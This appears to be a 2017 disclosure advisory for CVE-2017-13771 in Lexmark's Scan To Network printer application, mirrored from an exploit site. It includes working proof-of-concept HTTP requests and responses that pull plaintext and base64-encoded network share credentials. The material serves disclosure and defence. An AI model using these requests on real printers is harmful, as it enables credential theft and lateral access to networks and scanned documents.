@@ -1,0 +1,100 @@
+id: 28422
+date: 09/04/2017
+title: Lexmark Scan To Network (SNF) 3.2.9 Information Disclosure Vulnerability
+author: Daniel Correa
+cves: CVE-2017-13771
+
+Summary
+=======
+1. Information exposure of network credentials in embedded printer
+application (CVE-2017-13771)
+
+
+Vendor
+======
+"Lexmark creates innovative imaging solutions and technologies that help
+customers worldwide print, secure and manage information with ease,
+efficiency and unmatched value. Combining innovative technologies with deep
+industry expertise, Lexmark simplifies the complex intersection of digital
+and printed information in retail, financial services, healthcare,
+manufacturing, education, government and more." [1].
+
+
+Tested version
+==============
+Lexmark Scan To Network (SNF) application <= 3.2.9
+
+
+Vulnerabilitiy and PoC
+=======================
+"The Embedded Scan to Network solution is an embedded Java application that
+is installed as a flash file on multifunction printers (MFPs) which support
+the Lexmark Embedded Solutions Framework (LeSF). It allows users at the
+printer to scan their documents to network destinations specified by the
+network administrator" [2].
+
+Scan To Network application supports the configuration of network
+credentials and if used they will be stored in plaintext and transmited in
+every request to the configuration tab. The next request should be made to
+get plaintext credentials that could be used later to escalate privileges
+in the network or get access to scanned documents:
+
+
+POST https://host/cgi-bin/direct/printer/prtappauth/apps/snfDestServlet
+HTTP/1.1
+Host: host
+Content-Type: multipart/form-data; boundary=----boundary
+Content-Length: 181
+
+------boundary
+Content-Disposition: form-data; name="dests"
+
+scanToNet.factory.0
+------boundary
+Content-Disposition: form-data; name="editButton"
+
+Edit...
+------boundary--
+
+
+HTTP/1.1 200 OK
+...
+...
+<span id="cifs.uName">
+<span class="header">Username:</span>
+<input type="text" name="cifs.uName" value="TEST" class="control"
+maxlength="256"></input>
+<span id="cifs.pwd">
+<span class="header">Password:</span>
+<input type="password" name="cifs.pwd" value="TEST123"
+class="control"></input>
+
+
+
+It is possible to have too a base64-encoded password from application
+configuration export functionality:
+
+GET
+https://host/cgi-bin/direct/printer/prtappauth/apps/ImportExportServlet?exportButton=clicked
+HTTP/1.1
+Host: host
+
+
+HTTP/1.1 200 OK
+...
+...
+esf.cifs.inst.1.cifs.uName "TEST"
+esf.cifs.inst.1.cifs.pwd "VEVTVDEyMw=="
+
+
+Timeline
+========
+19/05/2017: Vendor is notified through security email
+30/08/2017: No response from vendor, CVE assigned, full disclosure
+
+
+[1] https://www.lexmark.com/en_us/about/company.html
+[2]
+http://support.lexmark.com/library/LEXMARK/primus/files/PATTLNK_8312007_1530-AdminGuide.pdf
+
+#  0day.today [2023-03-26]  #
